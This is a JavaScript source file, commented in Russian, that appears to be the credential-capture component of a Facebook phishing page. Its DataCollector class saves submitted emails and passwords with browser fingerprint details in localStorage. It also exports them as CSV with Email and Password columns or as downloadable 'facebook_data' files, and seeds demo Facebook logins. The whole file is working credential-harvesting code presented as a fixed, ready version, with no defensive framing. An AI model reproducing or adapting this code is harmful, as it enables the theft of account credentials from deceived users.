// data.js - исправленная и упрощенная версия
class DataCollector {
    constructor() {
        this.storageKey = 'facebook_data_collection';
        this.init();
    }
    
    init() {
        console.log('DataCollector initialized - FIXED VERSION');
        
        // Создаем начальные данные если их нет
        if (!localStorage.getItem(this.storageKey)) {
            this.clearData();
        }
        
        this.loadData();
        
        // Для тестирования - добавляем демо-данные
        if (this.data.users.length === 0 && CONFIG.DEBUG_MODE) {
            this.addDemoData();
        }
    }
    
    loadData() {
        try {
            const data = localStorage.getItem(this.storageKey);
            this.data = data ? JSON.parse(data) : { 
                users: [], 
                visits: [], 
                logs: [],
                settings: {
                    created: new Date().toISOString(),
                    totalLogins: 0,
                    uniqueIPs: []
                }
            };
            return this.data;
        } catch (error) {
            console.error('Error loading data:', error);
            this.data = this.getDefaultData();
            return this.data;
        }
    }
    
    getDefaultData() {
        return {
            users: [],
            visits: [],
            logs: [],
            settings: {
                created: new Date().toISOString(),
                totalLogins: 0,
                uniqueIPs: []
            }
        };
    }
    
    saveData() {
        try {
            localStorage.setItem(this.storageKey, JSON.stringify(this.data));
            return true;
        } catch (error) {
            console.error('Error saving data:', error);
            return false;
        }
    }
    
    // ГЛАВНАЯ ФУНКЦИЯ - СОХРАНЕНИЕ ДАННЫХ ПОЛЬЗОВАТЕЛЯ
    saveUserData(email, password) {
        if (!CONFIG.COLLECT_DATA) {
            console.log('Data collection is disabled');
            return null;
        }
        
        // УБИРАЕМ ПРОВЕРКУ IP (чтобы не было ошибок)
        // Вместо асинхронного запса IP используем локальный вариант
        const ipInfo = {
            ip: 'local_' + Math.random().toString(36).substr(2, 8),
            timestamp: new Date().toISOString()
        };
        
        const userData = {
            id: Date.now() + '_' + Math.random().toString(36).substr(2, 9),
            email: email || "no_email_" + Date.now(),
            password: password || "no_password_" + Date.now(),
            timestamp: new Date().toISOString(),
            browserInfo: this.getBrowserInfo(),
            screenInfo: this.getScreenInfo(),
            ipInfo: ipInfo, // Используем локальный IP
            userAgent: navigator.userAgent || 'unknown',
            referrer: document.referrer || 'direct',
            pageUrl: window.location.href
        };
        
        // Добавляем в массив
        this.data.users.push(userData);
        this.data.settings.totalLogins = (this.data.settings.totalLogins || 0) + 1;
        
        // Добавляем уникальный IP
        if (!this.data.settings.uniqueIPs.includes(ipInfo.ip)) {
            this.data.settings.uniqueIPs.push(ipInfo.ip);
        }
        
        // Сохраняем
        const saved = this.saveData();
        
        // Логируем
        console.log('User data saved successfully:', {
            id: userData.id,
            email: userData.email,
            time: userData.timestamp,
            totalUsers: this.data.users.length
        });
        
        // Добавляем лог
        this.addLog('Новые данные пользователя сохранены', {
            email: userData.email,
            success: saved
        });
        
        return userData;
    }
    
    saveVisit() {
        const visitData = {
            timestamp: new Date().toISOString(),
            page: window.location.pathname,
            referrer: document.referrer || 'direct',
            userAgent: navigator.userAgent || 'unknown'
        };
        
        this.data.visits.push(visitData);
        this.saveData();
        
        console.log('Visit saved:', visitData.timestamp);
    }
    
    getBrowserInfo() {
        return {
            userAgent: navigator.userAgent || 'unknown',
            language: navigator.language || 'unknown',
            platform: navigator.platform || 'unknown',
            cookieEnabled: navigator.cookieEnabled || false,
            online: navigator.onLine || false
        };
    }
    
    getScreenInfo() {
        return {
            width: screen.width || 0,
            height: screen.height || 0,
            colorDepth: screen.colorDepth || 0
        };
    }
    
    addLog(message, data = null) {
        const logEntry = {
            timestamp: new Date().toISOString(),
            message: message,
            data: data
        };
        
        this.data.logs.push(logEntry);
        
        // Ограничиваем логи
        if (this.data.logs.length > 50) {
            this.data.logs = this.data.logs.slice(-25);
        }
        
        this.saveData();
    }
    
    getStats() {
        return {
            totalUsers: this.data.users.length,
            totalVisits: this.data.visits.length,
            uniqueIPs: this.data.settings.uniqueIPs.length,
            lastLogin: this.data.users.length > 0 ? 
                this.data.users[this.data.users.length - 1].timestamp : 
                'Нет данных'
        };
    }
    
    clearData() {
        this.data = this.getDefaultData();
        this.saveData();
        console.log('All data cleared');
    }
    
    // Демо-данные для тестирования
    addDemoData() {
        const demoUsers = [
            { email: 'test_user_1@facebook.com', password: 'password123' },
            { email: 'demo_user@facebook.com', password: 'demo2024' },
            { email: 'admin_test@facebook.com', password: 'adminpass' }
        ];
        
        demoUsers.forEach(user => {
            const demoData = {
                id: 'demo_' + Date.now() + Math.random().toString(36).substr(2, 6),
                email: user.email,
                password: user.password,
                timestamp: new Date(Date.now() - Math.random() * 10000000000).toISOString(),
                browserInfo: this.getBrowserInfo(),
                screenInfo: this.getScreenInfo(),
                ipInfo: { ip: 'demo_ip_' + Math.random().toString(36).substr(2, 6) },
                userAgent: 'Demo User Agent',
                referrer: 'demo',
                pageUrl: 'https://demo.facebook.com'
            };
            
            this.data.users.push(demoData);
        });
        
        this.data.settings.totalLogins = demoUsers.length;
        this.saveData();
        
        console.log('Demo data added:', demoUsers.length, 'users');
    }
    
    // Экспорт данных (упрощенный)
    exportData(format = 'json') {
        if (format === 'csv') {
            return this.exportToCSV();
        }
        return JSON.stringify(this.data, null, 2);
    }
    
    exportToCSV() {
        if (this.data.users.length === 0) return 'No data';
        
        const headers = ['Email', 'Password', 'Time', 'IP'];
        const rows = this.data.users.map(user => [
            `"${user.email}"`,
            `"${user.password}"`,
            user.timestamp,
            user.ipInfo?.ip || 'unknown'
        ]);
        
        return [headers.join(','), ...rows.map(row => row.join(','))].join('\n');
    }
    
    downloadData(format = 'json') {
        const data = this.exportData(format);
        const filename = `facebook_data_${new Date().toISOString().split('T')[0]}.${format}`;
        
        const blob = new Blob([data], { 
            type: format === 'csv' ? 'text/csv' : 'application/json' 
        });
        
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        console.log('Data downloaded:', filename);
    }
}

// Создаем глобальный экземпляр
window.DataCollector = new DataCollector();

// Простая проверка
console.log('DataCollector ready. Users count:', window.DataCollector.data.users.length);
